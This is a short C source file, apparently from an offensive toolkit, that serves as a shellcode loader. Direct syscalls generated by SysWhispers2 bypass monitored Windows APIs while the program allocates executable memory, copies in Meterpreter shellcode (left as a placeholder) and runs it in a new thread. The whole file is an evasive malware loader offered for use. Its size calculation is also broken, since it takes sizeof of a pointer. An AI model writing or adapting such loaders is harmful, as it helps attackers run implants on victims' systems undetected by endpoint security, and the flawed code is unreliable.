//x86_64-w64-mingw32-gcc syswhis.c ../libkitty/x64/syswhispers2/syscalls.c ../libkitty/x64/syswhispers2/syscallsstubs.s

#include <stdio.h>
#include <windows.h>
#include "syswhispers2/syscalls.h"

extern HMODULE syscallRopPtr;

int main() {
    // Insert Meterpreter shellcode
    unsigned char *code = "\xc3...";


    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(code);
    HANDLE hThread;
    NTSTATUS status;

    allocation_start = NULL;

    FindSyscallInstructionNTDLL();

    // Allocate Virtual Memory 
    NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    printf("allocation_start %p\n",allocation_start);

    // Copy shellcode into allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0);


    // Execute shellcode in memory 
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);


    // Wait for the end of the thread and close the handle
    NtWaitForSingleObject(hThread, FALSE, NULL);
    NtClose(hThread);

    printf("exited successfully\n");

    return 0;
}